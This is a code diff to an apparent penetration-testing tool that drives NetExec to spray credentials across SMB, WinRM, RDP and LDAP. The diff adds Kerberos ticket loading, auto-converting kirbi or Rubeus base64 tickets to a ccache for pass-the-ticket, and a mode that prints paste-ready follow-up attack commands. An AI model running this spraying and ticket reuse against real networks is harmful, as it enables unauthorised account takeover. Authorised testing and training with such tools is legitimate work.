         role_flag = False
         for key, plines in result.protocol_lines.items():
@@ -2613,8 +3288,13 @@ class TomSploit:
                     role_flag = True
                 if key.startswith("ldap-") and marker == "[*]" and not ldap_info:
                     ldap_info = msg
-        # anonymous LDAP probe answering is itself evidence LDAP is live
-        if result.anon_ldap or result.anon_ldap_lines:
+        # The anonymous LDAP probe answering is itself evidence LDAP is live —
+        # but only if it actually answered. A non-empty anon_ldap_lines used
+        # to be enough, and that list is non-empty even when it holds nothing
+        # but "[!] Anonymous LDAP check timed out".
+        if result.anon_ldap or any(
+                parse_nxc_line(l)[0] in ("[*]", "[+]")
+                for l in result.anon_ldap_lines):
             ldap_open = True
         result.is_dc = detect_dc(result.target_info, ldap_open,
                                  ldap_info, role_flag, self.cfg.domain)
@@ -2668,6 +3348,8 @@ class TomSploit:
                     self._guard(self.reporter.target_header, target)
                     open_protos, closed = self._probe(target)
                     result = TargetResult(target=target,
+                                          nxc_target=target,
+                                          probed=not self.cfg.no_port_probe,
                                           open_protocols=open_protos,
                                           closed_protocols=closed)
                     if not open_protos:
@@ -2679,6 +3361,9 @@ class TomSploit:
                         continue
 
                     self._guard(self.reporter.port_probe, result)
+                    # Must run BEFORE the spray: it decides what name every
+                    # subsequent nxc invocation is given.
+                    self._resolve_kerberos_target(result)
                     if "smb" in result.open_protocols:
                         self._lockout_precheck(result)
                     self._guard(self.reporter.lockout_warning, result)
@@ -2761,9 +3446,18 @@ class TomSploit:
     def _persist(self, results: list[TargetResult]) -> None:
         """Flush structured output after every target rather than only at the
         end. A hard kill — OOM, closed terminal, exam VM reset — used to lose
-        the entire JSON and log; now it loses at most the target in flight."""
-        if self.cfg.json_out:
+        the entire JSON and log; now it loses at most the target in flight.
+
+        Guarded: a mid-run persistence failure must never surface as a scan
+        error for the host in flight. _write_json already writes atomically
+        and catches its own OSError, but this is belt-and-braces so nothing
+        here can ever propagate into the per-target except."""
+        if not self.cfg.json_out:
+            return
+        try:
             self._write_json(results)
+        except Exception:
+            pass
 
     def _write_json(self, results: list[TargetResult]) -> None:
         def ser_succ(s: Success) -> dict:
@@ -2834,7 +3528,7 @@ class TomSploit:
                         for s in r.successes:
                             adm = " (admin)" if s.is_admin else ""
                             f.write(f"  [+] {s.protocol} {s.scope}  "
-                                    f"{s.user}:{s.secret}{adm}\n")
+                                    f"{s.user}:{s.secret or '(ccache)'}{adm}\n")
                     else:
                         f.write("  no valid credentials\n")
         except OSError as exc:
@@ -2902,6 +3596,7 @@ examples:
   tomsploit -t 192.168.1.10 -u admin -k
   tomsploit -t 192.168.1.10 -u admin -p pw --protocols smb,winrm,rdp
   tomsploit -t targets.txt -u u.txt -p p.txt --creds-file creds.tsv
+  tomsploit -t 192.168.1.10 -u admin -p pw --sh > next.sh   # paste-ready commands
 """,
     )
     p.add_argument("-t", "--target", required=True,
@@ -2918,9 +3613,18 @@ examples:
                         "Use when nxc guesses wrong, or when the target's own "
                         "output doesn't name a domain. Ignored for "
                         "--local-auth attempts.")
-    p.add_argument("-k", "--kerberos", action="store_true",
-                   help="Use Kerberos ticket cache (--use-kcache). "
-                        "Requires KRB5CCNAME. Cannot mix with -p/-H.")
+    p.add_argument("-k", "--kerberos", nargs="?", const=True, default=False,
+                   metavar="TICKET",
+                   help="Authenticate with a Kerberos ticket cache "
+                        "(nxc --use-kcache) instead of -p/-H. "
+                        "With no argument, uses the ticket already in "
+                        "$KRB5CCNAME. Optionally give a PATH to a ticket file: "
+                        "tomsploit auto-detects whether it's a ccache or a "
+                        "kirbi (raw DER or base64), converts a kirbi to ccache "
+                        "for you (needs impacket-ticketConverter), and exports "
+                        "KRB5CCNAME itself. NOTE: -u must match the ticket's "
+                        "principal, and the target should be the DC's FQDN — an "
+                        "SPN needs a name, not an IP. Cannot mix with -p/-H.")
     p.add_argument("--paired", action="store_true",
                    help="Positional pairing instead of cross-spray: line N of "
                         "the users file is tried only against line N of the "
@@ -2934,7 +3638,7 @@ examples:
                         "Replaces -u/-p/-H; split on the first ':' so "
                         "passwords may contain colons.")
     p.add_argument("-o", "--output",
-                   help="nxc log file path (default: YYYY-MM-DD_HH-MM-SS.txt).")
+                   help="Write a consolidated scan log here (raw command output + a per-target summary). No default: omit -o and no log is written.")
     p.add_argument("--creds-file", metavar="FILE",
                    help="Append valid credentials to a TSV file.")
     p.add_argument("-w", "--workers", type=int, default=DEFAULT_WORKERS,
@@ -2959,6 +3663,11 @@ examples:
     verbosity.add_argument("-v", "--verbose", action="store_true",
                    help="Show every nxc line, including each failed login "
                         "(off by default — failures collapse to a count).")
+    verbosity.add_argument("--sh", action="store_true",
+                   help="Emit ONLY the suggested commands, flush-left, "
+                        "uncoloured, with findings as # comments — a "
+                        "paste-ready shell script. Progress and hits go to "
+                        "stderr, so `tomsploit ... --sh > next.sh` works.")
     p.add_argument("--no-color", action="store_true",
                    help="Disable ANSI colors.")
     p.add_argument("--debug", action="store_true",
@@ -2968,9 +3677,109 @@ examples:
     return p.parse_args()
 
 
+def _detect_ticket_format(raw: bytes) -> str:
+    """Classify a ticket blob by content, not extension (filenames lie).
+
+        ccache      MIT FILE credential cache — starts 0x05 0x0[1-4]
+                    (0x05 = format tag, next byte = minor version 1..4)
+        kirbi       DER-encoded KRB-CRED — [APPLICATION 22] = 0x76
+        kirbi_b64   base64 text that decodes to a kirbi (Rubeus /nowrap,
+                    or anything copy-pasted). Real tickets are >128 bytes,
+                    so the base64 almost always begins 'doI', but we decode
+                    and re-check the 0x76 tag rather than trust the prefix.
+        unknown     none of the above
+    """
+    if len(raw) >= 2 and raw[0] == 0x05 and raw[1] in (0x01, 0x02, 0x03, 0x04):
+        return "ccache"
+    if raw[:1] == b"\x76":
+        return "kirbi"
+    # Maybe base64. Strip whitespace, validate the alphabet, decode, re-check.
+    compact = bytes(c for c in raw if c not in b" \t\r\n")
+    if compact and re.fullmatch(rb"[A-Za-z0-9+/]+={0,2}", compact):
+        try:
+            decoded = base64.b64decode(compact, validate=True)
+        except Exception:
+            return "unknown"
+        if decoded[:1] == b"\x76":
+            return "kirbi_b64"
+    return "unknown"
+
+
+def _ticket_converter_cmd() -> list[str] | None:
+    """Locate impacket's ticketConverter under either name it ships as."""
+    exe = shutil.which("impacket-ticketConverter") or shutil.which("ticketConverter.py")
+    return [exe] if exe else None
+
+
+def load_kerberos_ticket(path: str) -> str:
+    """Resolve a ticket PATH to an absolute ccache path, converting a kirbi
+    (raw or base64) to ccache on the way. Returns the ccache path; the caller
+    exports it as KRB5CCNAME. Raises ValueError with a user-facing message on
+    anything that can't be turned into a usable ccache."""
+    if not os.path.isfile(path):
+        raise ValueError(f"-k: ticket file not found: {path}")
+    try:
+        with open(path, "rb") as fh:
+            raw = fh.read(1 << 20)          # tickets are a few KB; cap defensively
+    except OSError as exc:
+        raise ValueError(f"-k: cannot read ticket {path}: {exc}")
+
+    kind = _detect_ticket_format(raw)
+
+    if kind == "ccache":
+        return os.path.abspath(path)
+
+    if kind == "unknown":
+        raise ValueError(
+            f"-k: '{path}' isn't a recognised ticket. Expected a ccache "
+            f"(starts 0x05), a kirbi (starts 0x76), or base64 of a kirbi. "
+            f"If this came from Rubeus, pass the base64 blob or a .kirbi.")
+
+    # From here it's a kirbi (kind in {'kirbi','kirbi_b64'}) and needs converting.
+    conv = _ticket_converter_cmd()
+    if conv is None:
+        raise ValueError(
+            "-k: this ticket is a kirbi and needs converting to ccache, but "
+            "impacket-ticketConverter isn't on PATH. Install impacket "
+            "(apt install python3-impacket), or convert it yourself and pass "
+            "the .ccache.")
+
+    workdir = tempfile.mkdtemp(prefix="tomsploit_ticket_")
+    if kind == "kirbi_b64":
+        # Decode to a real .kirbi first; ticketConverter wants DER on disk.
+        compact = bytes(c for c in raw if c not in b" \t\r\n")
+        kirbi_path = os.path.join(workdir, "ticket.kirbi")
+        with open(kirbi_path, "wb") as fh:
+            fh.write(base64.b64decode(compact, validate=True))
+        src = kirbi_path
+    else:
+        src = os.path.abspath(path)
+
+    ccache_path = os.path.join(workdir, "ticket.ccache")
+    try:
+        proc = subprocess.run(conv + [src, ccache_path],
+                              stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                              text=True, timeout=30)
+    except (OSError, subprocess.TimeoutExpired) as exc:
+        raise ValueError(f"-k: ticketConverter failed to run: {exc}")
+    if proc.returncode != 0 or not os.path.isfile(ccache_path):
+        detail = proc.stdout.strip().splitlines()[-1] if proc.stdout.strip() else \
+                 f"exit {proc.returncode}"
+        raise ValueError(f"-k: kirbi→ccache conversion failed ({detail}).")
+    return ccache_path
+
+
 def build_config(args: argparse.Namespace) -> Config:
     """Validate the parsed args and expand files/CIDRs into one Config.
     Raises ValueError with a user-facing message on any bad combination."""
+    # -k is nargs='?': False when absent, True with no path, or a PATH string.
+    # Collapse to a bool for all the logic below, and if a path was given,
+    # resolve it to a ccache and export KRB5CCNAME now so every nxc child
+    # (which inherits this process's environment) picks it up.
+    kerberos_on = bool(args.kerberos)
+    ticket_path = args.kerberos if isinstance(args.kerberos, str) else None
+    args.kerberos = kerberos_on
+
     raw_targets = read_value_or_file(args.target, "targets")
     targets = expand_targets(raw_targets, args.max_cidr_hosts)
     if not targets:
@@ -3032,6 +3841,15 @@ def build_config(args: argparse.Namespace) -> Config:
 
     log_file = args.output            # only write a log when -o/--output is given
 
+    # A ticket path only survives validation in the -k (non-combo) path.
+    # Resolve it to a ccache (converting a kirbi if needed) and export it;
+    # _run_proc spawns nxc with the inherited environment, so this is all
+    # that "give it the ticket" requires.
+    if ticket_path is not None:
+        ccache = load_kerberos_ticket(ticket_path)   # raises ValueError on failure
+        os.environ["KRB5CCNAME"] = ccache
+        print(f"{DIM}🎫 KRB5CCNAME set to {ccache}{RESET}", file=sys.stderr)
+
     return Config(
         targets=targets, users=users, passwords=passwords, hashes=hashes,
         kerberos=args.kerberos, protocols=protocols, log_file=log_file,
@@ -3040,12 +3858,14 @@ def build_config(args: argparse.Namespace) -> Config:
         debug=args.debug, no_port_probe=args.no_port_probe,
         paired=paired, domain=(args.domain or "").strip(),
         force=args.force, max_attempts=args.max_attempts,
+        sh_only=args.sh,
     )
 
 
 def main() -> int:
     args = parse_args()
-    configure_colors(args.no_color)
+    # --sh must emit a clean script: no ANSI, ever.
+    configure_colors(args.no_color or args.sh)
 
     try:
         cfg = build_config(args)
